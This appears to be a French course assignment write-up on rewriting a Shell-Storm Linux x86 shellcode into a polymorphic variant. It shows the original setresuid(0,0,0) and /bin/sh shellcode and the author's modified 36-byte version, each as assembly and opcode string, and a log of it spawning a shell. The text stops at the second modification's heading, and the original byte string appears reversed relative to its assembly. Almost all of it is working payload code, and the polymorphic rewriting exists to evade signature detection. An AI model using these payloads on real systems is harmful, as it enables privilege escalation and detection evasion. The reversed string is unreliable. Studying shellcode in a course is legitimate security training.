# Assignement 6 #

Dans cette section, il est demandé de proposer une version polymorphique de 3 shellcodes issus de la plateforme shellstorm.
 - http://shell-storm.org/shellcode/files/shellcode-220.php


## Première modification ##

Source : http://shell-storm.org/shellcode/files/shellcode-220.php

```c
{==========================================================}
{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }
{==========================================================}
--[code]--
BITS 32
 
;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80
 
;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
--[/code]--
 
Shellcode string:
--[code]--
char shellcode [] =
"\x80\xcd\xe1\x89\x53\xe2\x89\x51\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x51\x58\x0b\x6a\x80\xcd\xa4\xb0\x99\xc9\x31\xdb\x31\xc0\x31"
-[/code]-
 
# milw0rm.com [2008-09-29]
```c

http://shell-storm.org/shellcode/files/shellcode-220.php
linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes
Polymorphic version 36 bytes
Author : xophidia

global _start

section .text

_start:

    ;setresuid(0,0,0)

    xor ecx, ecx
    mul ecx
    mov ebx, ecx
    cdq
    mov al, 0xa4
    int 0x80

    ;execve("/bin//sh", ["/bin//sh", NULL], [NULL])

    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push ecx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80

"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

xophidia@xophidia-VirtualBox:~/Documents/Shellcode/as6$ ./test_shellcode
taille 36
$ 
```

## Seconde modification ##